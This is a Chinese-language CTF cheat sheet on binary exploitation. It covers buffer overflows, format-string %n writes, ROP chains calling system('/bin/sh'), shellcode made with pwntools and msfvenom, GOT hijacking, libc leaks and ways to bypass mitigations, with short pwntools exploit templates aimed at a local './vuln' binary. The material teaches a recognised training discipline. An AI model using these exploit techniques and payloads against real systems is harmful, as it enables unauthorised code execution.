## Pwn（Binary Exploitation）

Pwn 是 CTF 中的二進位漏洞利用題型，重點在於理解程式記憶體結構、漏洞觸發點與控制流程等技巧。常見攻擊包含 Buffer Overflow、Format String、ROP、Heap Exploitation 等。

---

### 基本結構與流程

#### 執行流程簡述
1. 使用者執行二進位檔（Binary）
2. 作業系統載入 ELF，初始化堆疊與記憶體
3. 開始執行 `main` 函數，依序執行程式邏輯
4. 若發生漏洞，可透過特定輸入觸發控制流程改變

#### 常見安全機制（防禦機制）

| 機制          | 說明                                                   |
|---------------|--------------------------------------------------------|
| NX            | 記憶體區段不可執行（No eXecute），防止 Shellcode 執行 |
| PIE           | 程式載入位址隨機化（Position Independent Executable） |
| ASLR          | 記憶體佈局隨機化（Address Space Layout Randomization）|
| Stack Canary  | 堆疊保護，檢查返回位址前的 canary 值有無被覆蓋        |
| RELRO         | GOT 表寫入保護（Partial / Full RELRO）                |

使用 `checksec` 工具查看目標程式防禦狀態：
```bash
checksec binary
```

---

## 漏洞類型與利用技巧

### Buffer Overflow（緩衝區溢位）

#### 攻擊原理
- 利用超出緩衝區大小的輸入覆蓋關鍵變數或返回位址。

#### 常見利用手法
- 覆蓋 return address → 劫持程式流程
- 修改函數指標或跳轉點
- 配合 Shellcode、ROP 等技術達成任意執行

#### 基本利用範例
```c
char buf[32];
gets(buf);  // 無邊界檢查，容易 BOF
```

使用 Python 產生 payload：
```bash
python3 -c "print('A'*40 + '\xef\xbe\xad\xde')" > payload
```

#### 工具技巧
- `cyclic`：產生不重複 pattern
- `pattern_offset`：找出 offset 偏移位置
```bash
cyclic 100
pattern_offset -q 6161616c
```

- 使用 pwntools 撰寫利用腳本：
```python
from pwn import *

p = process('./vuln')
payload = b'A' * 40 + p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
```

---

### Format String（格式化字串漏洞）

#### 攻擊原理
- printf 等格式化函數使用不當，允許讀取/寫入任意記憶體

#### 常見利用
- 泄漏堆疊資訊、libc 位址
- 修改記憶體值（ex: GOT 改寫）

#### 範例程式
```c
char name[100];
scanf("%s", name);
printf(name); // 漏洞點
```

#### 常見 Payload
```bash
# 泄漏地址
payload = "%p %p %p"

# 寫入值 (%n)
payload = "%1337c%10$n"
```

#### 利用技巧
- `%p`、`%x`：讀堆疊
- `%n`：寫入
- 利用偏移 `%<offset>$p` 定位具體參數位置
- 搭配 GOT 改寫函數指標

---

### ROP（Return Oriented Programming）

#### 攻擊原理
- 利用程式中現有指令片段（gadgets）組成惡意流程，繞過 NX

#### 常見用途
- 呼叫 system("/bin/sh")
- 呼叫 execve、mprotect、read 取得 shell
- 在無 system() 情況下構造 syscalls

#### 工具
- `ROPgadget`：
```bash
ROPgadget --binary vuln
```

- `pwntools` 自動尋找：
```python
rop = ROP(elf)
rop.system(next(elf.search(b"/bin/sh")))
```

---

### Shellcode 注入

#### 原理
- 注入機器碼指令至記憶體中，再跳轉執行

#### 常見架構
- Linux x86 / x64 常用 execve('/bin/sh')
- 配合 BOF 利用 `jmp esp` 跳入 shellcode

#### Shellcode 產生方式
- 使用 `pwntools`:
```python
from pwn import *
context.arch = 'amd64'
print(asm(shellcraft.sh()))
```

- 使用 `msfvenom`:
```bash
msfvenom -p linux/x64/exec CMD=/bin/sh -f elf > shell
```

---

### GOT Hijacking（GOT 表劫持）

#### 原理
- 修改 GOT 表中的某函數地址，使其執行惡意程式碼

#### 利用條件
- 有格式化字串、溢位或任意寫
- RELRO 不為 Full

#### 步驟
1. 找到目標函數 GOT
2. 改寫為 system 或 shellcode 位址
3. 觸發該函數呼叫

---

### Heap Exploitation（堆積區漏洞）

#### 常見漏洞類型
- Use-After-Free
- Double Free
- Unsorted Bin Attack
- Fastbin Dup
- House of [各種技巧]

#### 常見函數
- `malloc` / `free`
- `calloc` / `realloc`

#### 利用工具
- `libc-database` 找 libc
- `heap-exploitation` cheat sheet
- `pwndbg` 查看堆結構

---

### Libc 泄漏與利用

#### 為何要泄漏 libc
- libc 內含 system、/bin/sh 等函數與字串
- 隨機化環境中需動態解析

#### 泄漏方式
- format string 泄漏
- 泄漏 puts / printf@GOT

#### 利用方式
```python
libc = ELF('libc.so.6')
libc_base = leaked_puts - libc.sym['puts']
system = libc_base + libc.sym['system']
```

---

## 利用腳本撰寫流程（pwntools）

```python
from pwn import *

context.binary = './vuln'
p = process('./vuln')  # or remote('ip', port)
elf = ELF('./vuln')
rop = ROP(elf)

payload = b'A' * offset + p64(rop.ret.address) + p64(elf.symbols['win'])

p.sendlineafter('>', payload)
p.interactive()
```

---

## 防禦與繞過技巧

| 防禦機制    | 繞過技巧                           |
|-------------|------------------------------------|
| NX          | ROP / Shellcode in RW region       |
| ASLR        | 泄漏 libc / PIE base               |
| PIE         | 泄漏 text base 再偏移計算          |
| Stack Canary| 泄漏 canary / 覆蓋前爆破            |
| Full RELRO  | 無法改 GOT，需用其他任意寫原始結構 |

---

## 常用工具整理

- `pwntools`：Pwn 腳本必備工具
- `checksec`：檢查保護機制
- `gdb + pwndbg / gef`：除錯與記憶體觀察
- `ROPgadget`：ROP gadget 搜尋
- `one_gadget`：libc 中直接呼叫 /bin/sh 的位置
- `libc-database`：查找對應 libc 版本

---

## 實戰建議流程

1. `checksec` 檢查目標保護機制
2. 用 `gdb` 除錯找漏洞類型與 offset
3. 泄漏 libc、canary、PIE 等資訊
4. 撰寫 ROP / Shellcode 利用腳本
5. 若遠端，記得處理 I/O 與交互細節

---

## 參考資源

- [CTF Wiki - Pwn](https://ctf-wiki.org/pwn/)
- [ropemporium](https://ropemporium.com/)
- [one_gadget](https://github.com/david942j/one_gadget)
- [libc-database](https://github.com/niklasb/libc-database)